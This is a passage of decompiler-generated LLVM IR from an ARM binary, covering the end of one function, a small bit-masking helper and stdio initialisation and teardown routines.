  %v0_165b0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_165b4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_165b0 = inttoptr i32 %v0_165b0.pre to i32*
  %v2_165b0 = load i32, i32* %v1_165b0, align 4
  store i32 %v2_165b0, i32* %r3.global-to-local, align 4
  %v3_165b4 = icmp uge i32 %v2_165b0, %v1_165b4.pre
  store i1 %v3_165b4, i1* %cpsr_c.global-to-local, align 1
  %v9_165b4 = icmp eq i32 %v2_165b0, %v1_165b4.pre
  br i1 %v9_165b4, label %dec_label_pc_165bc, label %dec_label_pc_165d4

dec_label_pc_165d0:                               ; preds = %dec_label_pc_165bc
  %v0_165d0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_165d0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_165d4

dec_label_pc_165d4:                               ; preds = %dec_label_pc_165a4, %dec_label_pc_165bc.dec_label_pc_165b0_crit_edge, %dec_label_pc_165d0
  %v0_165dc = phi i32 [ %v0_165d0, %dec_label_pc_165d0 ], [ %v2_165b083, %dec_label_pc_165a4 ], [ %v2_165b0, %dec_label_pc_165bc.dec_label_pc_165b0_crit_edge ]
  %v1_165d4 = phi i32 [ %v0_165d0, %dec_label_pc_165d0 ], [ %v2_165a4, %dec_label_pc_165a4 ], [ %v1_165b4.pre, %dec_label_pc_165bc.dec_label_pc_165b0_crit_edge ]
  %v3_165d4 = icmp uge i32 %v0_165dc, %v1_165d4
  store i1 %v3_165d4, i1* %cpsr_c.global-to-local, align 1
  %v9_165d4 = icmp eq i32 %v0_165dc, %v1_165d4
  br i1 %v9_165d4, label %dec_label_pc_165dc, label %dec_label_pc_165d4.dec_label_pc_165a4_crit_edge

dec_label_pc_165d4.dec_label_pc_165a4_crit_edge:  ; preds = %dec_label_pc_165d4
  %v0_165a4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_165a4

dec_label_pc_165dc:                               ; preds = %dec_label_pc_165d4
  %v2_165dc = icmp ne i32 %v1_165d4, 0
  store i1 %v2_165dc, i1* %cpsr_c.global-to-local, align 1
  %v7_165e0 = icmp slt i32 %v1_165d4, 2
  br i1 %v7_165e0, label %dec_label_pc_165fc, label %dec_label_pc_165e4

dec_label_pc_165e4:                               ; preds = %dec_label_pc_165dc
  %v0_165e4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_165e4, i32* %r0.global-to-local, align 4
  %v0_165e8 = load i32, i32* @r1, align 4
  %v1_165e8 = add i32 %v0_165e8, 129
  store i32 %v1_165e8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_165fc

dec_label_pc_165fc:                               ; preds = %dec_label_pc_16560, %dec_label_pc_165e4, %dec_label_pc_165dc
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16600 = load i32, i32* @r8, align 4
  %v2_16600 = add i32 %v0_16600, 160
  %v3_16600 = inttoptr i32 %v2_16600 to i32*
  %v4_16600 = load i32, i32* %v3_16600, align 4
  store i32 %v4_16600, i32* %r0.global-to-local, align 4
  %v1_16604 = add i32 %v4_16600, 4
  %v2_16604 = inttoptr i32 %v1_16604 to i32*
  %v3_16604 = load i32, i32* %v2_16604, align 4
  %v1_16608 = add i32 %v3_16604, -1
  store i32 %v1_16608, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1660c = icmp eq i32 %v1_16608, 0
  store i32 %v1_16608, i32* %v2_16604, align 4
  br i1 %v2_1660c, label %dec_label_pc_16618, label %dec_label_pc_16680

dec_label_pc_16618:                               ; preds = %dec_label_pc_165fc
  %v0_16618 = load i32, i32* %r3.global-to-local, align 4
  %v1_16618 = load i32, i32* %r0.global-to-local, align 4
  %v2_16618 = add i32 %v1_16618, 8
  %v3_16618 = inttoptr i32 %v2_16618 to i32*
  store i32 %v0_16618, i32* %v3_16618, align 4
  %v0_1661c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1661c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16620

dec_label_pc_16620:                               ; preds = %dec_label_pc_16650.dec_label_pc_16620_crit_edge, %dec_label_pc_16618
  %v0_16620 = phi i32 [ %v0_16620.pre, %dec_label_pc_16650.dec_label_pc_16620_crit_edge ], [ %v0_1661c, %dec_label_pc_16618 ]
  %v1_16620 = inttoptr i32 %v0_16620 to i32*
  %v2_16620 = load i32, i32* %v1_16620, align 4
  store i32 %v2_16620, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_16620, i32* %r2.global-to-local, align 4
  %v2_1662c71 = load i32, i32* %v1_16620, align 4
  store i32 %v2_1662c71, i32* %r3.global-to-local, align 4
  %v3_1663073 = icmp uge i32 %v2_1662c71, %v2_16620
  store i1 %v3_1663073, i1* %cpsr_c.global-to-local, align 1
  %v9_1663079 = icmp eq i32 %v2_1662c71, %v2_16620
  br i1 %v9_1663079, label %dec_label_pc_16638, label %dec_label_pc_16650

dec_label_pc_16638:                               ; preds = %dec_label_pc_16620, %dec_label_pc_16638.dec_label_pc_1662c_crit_edge
  %v0_1663880 = phi i32 [ %v1_16630.pre, %dec_label_pc_16638.dec_label_pc_1662c_crit_edge ], [ %v2_16620, %dec_label_pc_16620 ]
  store i32 %v0_1663880, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16648 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16648, label %dec_label_pc_1664c, label %dec_label_pc_16638.dec_label_pc_1662c_crit_edge

dec_label_pc_16638.dec_label_pc_1662c_crit_edge:  ; preds = %dec_label_pc_16638
  %v0_1662c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16630.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1662c = inttoptr i32 %v0_1662c.pre to i32*
  %v2_1662c = load i32, i32* %v1_1662c, align 4
  store i32 %v2_1662c, i32* %r3.global-to-local, align 4
  %v3_16630 = icmp uge i32 %v2_1662c, %v1_16630.pre
  store i1 %v3_16630, i1* %cpsr_c.global-to-local, align 1
  %v9_16630 = icmp eq i32 %v2_1662c, %v1_16630.pre
  br i1 %v9_16630, label %dec_label_pc_16638, label %dec_label_pc_16650

dec_label_pc_1664c:                               ; preds = %dec_label_pc_16638
  %v0_1664c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1664c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16650

dec_label_pc_16650:                               ; preds = %dec_label_pc_16620, %dec_label_pc_16638.dec_label_pc_1662c_crit_edge, %dec_label_pc_1664c
  %v0_16658 = phi i32 [ %v0_1664c, %dec_label_pc_1664c ], [ %v2_1662c71, %dec_label_pc_16620 ], [ %v2_1662c, %dec_label_pc_16638.dec_label_pc_1662c_crit_edge ]
  %v1_16650 = phi i32 [ %v0_1664c, %dec_label_pc_1664c ], [ %v2_16620, %dec_label_pc_16620 ], [ %v1_16630.pre, %dec_label_pc_16638.dec_label_pc_1662c_crit_edge ]
  %v3_16650 = icmp uge i32 %v0_16658, %v1_16650
  store i1 %v3_16650, i1* %cpsr_c.global-to-local, align 1
  %v9_16650 = icmp eq i32 %v0_16658, %v1_16650
  br i1 %v9_16650, label %dec_label_pc_16658, label %dec_label_pc_16650.dec_label_pc_16620_crit_edge

dec_label_pc_16650.dec_label_pc_16620_crit_edge:  ; preds = %dec_label_pc_16650
  %v0_16620.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16620

dec_label_pc_16658:                               ; preds = %dec_label_pc_16650
  %v2_16658 = icmp ne i32 %v1_16650, 0
  store i1 %v2_16658, i1* %cpsr_c.global-to-local, align 1
  %v7_1665c = icmp slt i32 %v1_16650, 2
  br i1 %v7_1665c, label %dec_label_pc_16680, label %dec_label_pc_16660

dec_label_pc_16660:                               ; preds = %dec_label_pc_16658
  %v0_16660 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16660, i32* %r0.global-to-local, align 4
  %v0_16664 = load i32, i32* @r1, align 4
  %v1_16664 = add i32 %v0_16664, 129
  store i32 %v1_16664, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16680

dec_label_pc_1667c:                               ; preds = %dec_label_pc_162c0, %dec_label_pc_162a4, %dec_label_pc_162cc
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_16680

dec_label_pc_16680:                               ; preds = %dec_label_pc_165fc, %dec_label_pc_16658, %bb57, %dec_label_pc_16304, %dec_label_pc_16660, %dec_label_pc_1667c
  %v0_16680 = load i32, i32* @r5, align 4
  store i32 %v0_16680, i32* %r0.global-to-local, align 4
  %v2_16688 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_16688, i32* %r4.global-to-local, align 4
  store i32 %v6_16264, i32* @r5, align 4
  store i32 %v9_16264, i32* @r6, align 4
  store i32 %v12_16264, i32* @r7, align 4
  store i32 %v15_16264, i32* @r8, align 4
  ret i32 %v0_16680

; uselistorder directives
  uselistorder i32 %v0_1664c, { 1, 0, 2 }
  uselistorder i32 %v1_16630.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16620, { 1, 0 }
  uselistorder i32 %v0_165d0, { 1, 0, 2 }
  uselistorder i32 %v1_165b4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_165a4, { 1, 0 }
  uselistorder i32 %v0_1654c, { 1, 0, 2 }
  uselistorder i32 %v1_16530.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_164e4, { 1, 0, 2 }
  uselistorder i32 %v1_164c8, { 0, 2, 1 }
  uselistorder i32 %v4_164a4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_16454.pre, { 2, 1, 0 }
  uselistorder i32 %v0_163d8, { 1, 2, 0 }
  uselistorder i32 %v1_16368, { 1, 0 }
  uselistorder i32 %v0_16368, { 1, 0 }
  uselistorder i32 %v1_16350, { 1, 2, 0, 3 }
  uselistorder i32 %v1_162f4, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 52, 5, 6, 7, 8, 9, 11, 10, 51, 13, 12, 14, 15, 16, 17, 18, 19, 21, 20, 53, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0, 49, 50 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 25, 22, 23, 24, 26, 27, 28 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 10, 9, 1, 11, 12, 13, 36, 37, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i32 16384, { 75, 76, 0, 77, 38, 68, 39, 69, 40, 70, 41, 71, 42, 72, 43, 73, 18, 74, 17, 64, 16, 52, 36, 53, 3, 54, 4, 55, 5, 56, 37, 57, 6, 58, 7, 59, 8, 60, 9, 61, 10, 62, 11, 63, 35, 65, 12, 66, 13, 67, 44, 80, 14, 81, 15, 82, 19, 78, 45, 79, 21, 83, 47, 84, 48, 85, 49, 86, 20, 87, 46, 88, 89, 22, 90, 23, 91, 24, 92, 50, 93, 25, 1, 26, 94, 27, 95, 29, 96, 28, 97, 31, 98, 30, 99, 51, 100, 32, 2, 33, 101, 34, 102 }
  uselistorder i32 (i32, i32)* @__libc_open, { 8, 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 16, 0, 15, 12, 11, 2, 1, 14, 13, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 1024, { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder i32 ()* @malloc, { 49, 48, 47, 4, 3, 2, 0, 1, 7, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 6, 5 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i32 ()* @free, { 12, 11, 5, 4, 3, 2, 1, 8, 7, 6, 10, 9, 0 }
  uselistorder i8 97, { 1, 0 }
  uselistorder label %dec_label_pc_16680, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1667c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16650, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16638, { 1, 0 }
  uselistorder label %dec_label_pc_165fc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_165d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_165bc, { 1, 0 }
  uselistorder label %dec_label_pc_16560, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_16550, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16538, { 1, 0 }
  uselistorder label %dec_label_pc_164f8, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_164e8, { 1, 0 }
  uselistorder label %bb57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16430, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %dec_label_pc_16398._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_16340, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_162dc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_162a4, { 1, 2, 0 }
}

define i32 @function_16694(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16694:
  %v0_16694 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16694, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_16694
  %v5_16694 = sdiv i32 %arg2, 16
  %v6_16694 = and i32 %v5_16694, %arg1
  %v5_16698 = sdiv i32 %arg2, 256
  %v6_16698 = and i32 %v6_16694, %v5_16698
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16694, %bb
  %v7_1669c = phi i32 [ %arg1, %dec_label_pc_16694 ], [ %v6_16698, %bb ]
  ret i32 %v7_1669c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_166cc = call i32 @__aeabi_read_tp()
  %v3_166d0 = load i16, i16* @global_var_2225c.361, align 2
  %v4_166d0 = sext i16 %v3_166d0 to i32
  store i32 %v4_166d0, i32* @r3, align 4
  store i32 %v0_166cc, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_166dc = add i32 %v4_166d0, %v0_166cc
  %v3_166dc = inttoptr i32 %v2_166dc to i32*
  %v4_166dc = load i32, i32* %v3_166dc, align 4
  store i32 %v4_166dc, i32* @r6, align 4
  %v1_166e0 = call i32 @isatty(i32 0)
  %v2_166e8 = icmp eq i32 %v1_166e0, 0
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* @r4, align 4
  br i1 %v2_166e8, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_166f4 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 308) to i16*), align 4
  %v7_166f4 = zext i16 %v5_166f4 to i32
  %v2_166f8 = xor i32 %v7_166f4, 256
  store i32 %v2_166f8, i32* @r3, align 4
  %v2_166fc = trunc i32 %v2_166f8 to i16
  store i16 %v2_166fc, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 308) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_16704 = call i32 @isatty(i32 1)
  %v2_16708 = icmp eq i32 %v1_16704, 0
  br i1 %v2_16708, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_16710 = load i32, i32* @r4, align 4
  %v2_16714 = add i32 %v1_16710, 376
  %v3_16714 = inttoptr i32 %v2_16714 to i16*
  %v4_16714 = load i16, i16* %v3_16714, align 2
  %v2_16718 = xor i16 %v4_16714, 256
  store i16 %v2_16718, i16* %v3_16714, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_16724 = load i16, i16* @global_var_2225c.361, align 2
  %v4_16724 = sext i16 %v3_16724 to i32
  %v0_16728 = load i32, i32* @r6, align 4
  %v1_16728 = load i32, i32* @r5, align 4
  %v3_16728 = add i32 %v1_16728, %v4_16724
  %v4_16728 = inttoptr i32 %v3_16728 to i32*
  store i32 %v0_16728, i32* %v4_16728, align 4
  ret i32 %v1_16704

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_16744 = load i32, i32* @r4, align 4
  store i32 %v3_16744, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 -33100), i32* %r3.global-to-local, align 4
  %v2_16758 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 -33100) to i32*), align 4
  store i32 %v2_16758, i32* %r0.global-to-local, align 4
  %v5_16758 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 -33096) to i32*), align 4
  store i32 %v5_16758, i32* %r1.global-to-local, align 4
  %v8_16758 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 -33092) to i32*), align 4
  %v2_16760 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_16760, i32* %r3.global-to-local, align 4
  store i32 %v2_16758, i32* %stack_var_-44, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  %v4_1676c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 152) to i32*), align 4
  store i32 %v2_16758, i32* %r0.global-to-local, align 4
  store i32 %v5_16758, i32* %r1.global-to-local, align 4
  store i32 %v8_16758, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 -33112), i32* %r3.global-to-local, align 4
  %v1_1677c = inttoptr i32 %v4_1676c to i32*
  store i32 %v2_16758, i32* %v1_1677c, align 4
  %v3_1677c = add i32 %v4_1676c, 4
  %v4_1677c = inttoptr i32 %v3_1677c to i32*
  %v5_1677c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1677c, i32* %v4_1677c, align 4
  %v6_1677c = add i32 %v4_1676c, 8
  %v7_1677c = inttoptr i32 %v6_1677c to i32*
  %v8_1677c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1677c, i32* %v7_1677c, align 4
  %v0_16780 = load i32, i32* %r3.global-to-local, align 4
  %v1_16780 = inttoptr i32 %v0_16780 to i32*
  %v2_16780 = load i32, i32* %v1_16780, align 4
  store i32 %v2_16780, i32* %r0.global-to-local, align 4
  %v3_16780 = add i32 %v0_16780, 4
  %v4_16780 = inttoptr i32 %v3_16780 to i32*
  %v5_16780 = load i32, i32* %v4_16780, align 4
  store i32 %v5_16780, i32* %r1.global-to-local, align 4
  %v6_16780 = add i32 %v0_16780, 8
  %v7_16780 = inttoptr i32 %v6_16780 to i32*
  %v8_16780 = load i32, i32* %v7_16780, align 4
  %v2_16784 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_16784, i32* %r3.global-to-local, align 4
  store i32 %v2_16780, i32* %stack_var_-56, align 4
  store i32 76, i32* %r2.global-to-local, align 4
  %v0_16790 = load i32, i32* %r7.global-to-local, align 4
  %v2_16790 = add i32 %v0_16790, 76
  %v3_16790 = inttoptr i32 %v2_16790 to i32*
  %v4_16790 = load i32, i32* %v3_16790, align 4
  store i32 %v4_16790, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v1_16798 = inttoptr i32 %v4_16790 to i32*
  %v2_16798 = load i32, i32* %v1_16798, align 4
  store i32 %v2_16798, i32* %r5.global-to-local, align 4
  %v2_1679c = add i32 %v0_16790, 160
  %v3_1679c = inttoptr i32 %v2_1679c to i32*
  %v4_1679c = load i32, i32* %v3_1679c, align 4
  store i32 %v2_16780, i32* %r0.global-to-local, align 4
  store i32 %v5_16780, i32* %r1.global-to-local, align 4
  store i32 %v8_16780, i32* %r2.global-to-local, align 4
  store i32 -33124, i32* %r3.global-to-local, align 4
  %v2_167ac = add i32 %v0_16790, -33124
  store i32 %v2_167ac, i32* %sl.global-to-local, align 4
  %v1_167b0 = inttoptr i32 %v4_1679c to i32*
  store i32 %v2_16780, i32* %v1_167b0, align 4
  %v3_167b0 = add i32 %v4_1679c, 4
  %v4_167b0 = inttoptr i32 %v3_167b0 to i32*
  %v5_167b0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_167b0, i32* %v4_167b0, align 4
  %v6_167b0 = add i32 %v4_1679c, 8
  %v7_167b0 = inttoptr i32 %v6_167b0 to i32*
  %v8_167b0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_167b0, i32* %v7_167b0, align 4
  %v0_16840.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1684016 = icmp eq i32 %v0_16840.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1684818 = add i32 %v0_16840.pr, 56
  store i32 %v1_1684818, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_1684016, label %dec_label_pc_16854, label %dec_label_pc_167b8

dec_label_pc_167b8:                               ; preds = %entry, %.thread10
  %v0_167b8 = phi i32 [ %v3_1683c, %.thread10 ], [ %v0_16840.pr, %entry ]
  %v1_167b8 = add i32 %v0_167b8, 64
  %v2_167b8 = inttoptr i32 %v1_167b8 to i32*
  %v3_167b8 = load i32, i32* %v2_167b8, align 4
  store i32 %v3_167b8, i32* %r3.global-to-local, align 4
  %v0_167bc = call i32 @__aeabi_read_tp()
  store i32 %v0_167bc, i32* %r0.global-to-local, align 4
  %v1_167c0 = add i32 %v0_167bc, -1168
  store i32 %v1_167c0, i32* %r6.global-to-local, align 4
  %v3_167c4 = icmp uge i32 %v3_167b8, %v1_167c0
  store i1 %v3_167c4, i1* %cpsr_c.global-to-local, align 1
  %v9_167c4 = icmp eq i32 %v3_167b8, %v1_167c0
  br i1 %v9_167c4, label %.thread1, label %dec_label_pc_167d8

.thread1:                                         ; preds = %dec_label_pc_167b8
  %v1_167c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_167c8 = add i32 %v1_167c8, 60
  %v3_167c8 = inttoptr i32 %v2_167c8 to i32*
  %v4_167c8 = load i32, i32* %v3_167c8, align 4
  %v2_167cc = add i32 %v4_167c8, 1
  store i32 %v2_167cc, i32* %r3.global-to-local, align 4
  store i32 %v2_167cc, i32* %v3_167c8, align 4
  br label %.thread10

dec_label_pc_167d8:                               ; preds = %dec_label_pc_167b8, %dec_label_pc_167e4
  %v0_167d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_167d8 = inttoptr i32 %v0_167d8 to i32*
  %v2_167d8 = load i32, i32* %v1_167d8, align 4
  store i32 %v2_167d8, i32* %r3.global-to-local, align 4
  %v1_167dc = load i32, i32* %r4.global-to-local, align 4
  %v3_167dc = icmp uge i32 %v2_167d8, %v1_167dc
  store i1 %v3_167dc, i1* %cpsr_c.global-to-local, align 1
  %v9_167dc = icmp eq i32 %v2_167d8, %v1_167dc
  br i1 %v9_167dc, label %dec_label_pc_167e4, label %dec_label_pc_167fc

dec_label_pc_167e4:                               ; preds = %dec_label_pc_167d8
  store i32 %v2_167d8, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_167f4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_167f4, label %dec_label_pc_167f8, label %dec_label_pc_167d8

dec_label_pc_167f8:                               ; preds = %dec_label_pc_167e4
  %v0_167f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_167f8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_167fc

dec_label_pc_167fc:                               ; preds = %dec_label_pc_167d8, %dec_label_pc_167f8
  %v0_167fc = phi i32 [ %v0_167f8, %dec_label_pc_167f8 ], [ %v2_167d8, %dec_label_pc_167d8 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_167fc = icmp eq i32 %v0_167fc, 0
  %v2_16808.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_167fc, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_167fc
  %v1_16808 = load i32, i32* %r6.global-to-local, align 4
  %v3_16808 = add i32 %v2_16808.pre, 64
  %v4_16808 = inttoptr i32 %v3_16808 to i32*
  store i32 %v1_16808, i32* %v4_16808, align 4
  %v1_1680c = load i32, i32* %r1.global-to-local, align 4
  %v2_1680c = load i32, i32* %r5.global-to-local, align 4
  %v3_1680c = add i32 %v2_1680c, 60
  %v4_1680c = inttoptr i32 %v3_1680c to i32*
  store i32 %v1_1680c, i32* %v4_1680c, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_167fc
  %v2_16800 = add i32 %v2_16808.pre, 8
  %v3_16800 = inttoptr i32 %v2_16800 to i32*
  %v4_16800 = load i32, i32* %v3_16800, align 4
  store i32 %v4_16800, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_16810 = add i32 %v2_16808.pre, 20
  %v4_16810 = inttoptr i32 %v3_16810 to i32*
  store i32 %v4_16800, i32* %v4_16810, align 4
  %v1_16814 = load i32, i32* %r2.global-to-local, align 4
  %v2_16814 = trunc i32 %v1_16814 to i16
  %v3_16814 = load i32, i32* %r5.global-to-local, align 4
  %v4_16814 = inttoptr i32 %v3_16814 to i16*
  store i16 %v2_16814, i16* %v4_16814, align 2
  %v1_16818 = load i32, i32* %r3.global-to-local, align 4
  %v2_16818 = load i32, i32* %r5.global-to-local, align 4
  %v3_16818 = add i32 %v2_16818, 24
  %v4_16818 = inttoptr i32 %v3_16818 to i32*
  store i32 %v1_16818, i32* %v4_16818, align 4
  %v1_1681c = load i32, i32* %r3.global-to-local, align 4
  %v2_1681c = load i32, i32* %r5.global-to-local, align 4
  %v3_1681c = add i32 %v2_1681c, 28
  %v4_1681c = inttoptr i32 %v3_1681c to i32*
  store i32 %v1_1681c, i32* %v4_1681c, align 4
  %v1_16820 = load i32, i32* %r3.global-to-local, align 4
  %v2_16820 = load i32, i32* %r5.global-to-local, align 4
  %v3_16820 = add i32 %v2_16820, 16
  %v4_16820 = inttoptr i32 %v3_16820 to i32*
  store i32 %v1_16820, i32* %v4_16820, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_16824 = load i32, i32* %sl.global-to-local, align 4
  %v1_16824 = inttoptr i32 %v0_16824 to i32*
  %v2_16824 = load i32, i32* %v1_16824, align 4
  store i32 %v2_16824, i32* %r0.global-to-local, align 4
  %v3_16824 = add i32 %v0_16824, 4
  %v4_16824 = inttoptr i32 %v3_16824 to i32*
  %v5_16824 = load i32, i32* %v4_16824, align 4
  store i32 %v5_16824, i32* %r1.global-to-local, align 4
  %v6_16824 = add i32 %v0_16824, 8
  %v7_16824 = inttoptr i32 %v6_16824 to i32*
  %v8_16824 = load i32, i32* %v7_16824, align 4
  store i32 %v8_16824, i32* %r2.global-to-local, align 4
  %v1_1682c = load i32, i32* %r5.global-to-local, align 4
  %v2_1682c = add i32 %v1_1682c, 52
  %v3_1682c = inttoptr i32 %v2_1682c to i32*
  store i32 1, i32* %v3_1682c, align 4
  %v0_16830 = load i32, i32* %r5.global-to-local, align 4
  %v1_16830 = add i32 %v0_16830, 56
  store i32 %v1_16830, i32* %r3.global-to-local, align 4
  %v2_16834 = load i32, i32* %r0.global-to-local, align 4
  %v1_16838 = inttoptr i32 %v1_16830 to i32*
  store i32 %v2_16834, i32* %v1_16838, align 4
  %v3_16838 = add i32 %v0_16830, 60
  %v4_16838 = inttoptr i32 %v3_16838 to i32*
  %v5_16838 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16838, i32* %v4_16838, align 4
  %v6_16838 = add i32 %v0_16830, 64
  %v7_16838 = inttoptr i32 %v6_16838 to i32*
  %v8_16838 = load i32, i32* %r2.global-to-local, align 4
